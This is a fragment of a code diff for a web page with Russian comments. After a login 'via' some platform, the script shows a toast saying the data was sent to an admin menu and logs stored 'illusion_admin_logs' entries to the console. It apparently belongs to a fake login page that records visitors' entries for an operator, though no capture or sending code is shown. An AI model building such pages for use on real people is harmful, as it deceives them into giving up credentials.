+            showToast(`Вход через ${platform} выполнен. Данные отправлены в админ-меню!`);
+
+            // Имитация редиректа в панель
+            setTimeout(() => {
+                // Если у тебя готов файл админки, раскомментируй строку ниже и впиши путь
+                // window.location.href = 'admin.html';
+                console.log("Данные в БД админки:", JSON.parse(localStorage.getItem('illusion_admin_logs')));
+            }, 2000);
+        }
+
+        function showToast(message) {
+            toast.innerText = message;
+            toast.classList.add('show');
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 4000);
         }
     </script>
 </body>
 </html>
-
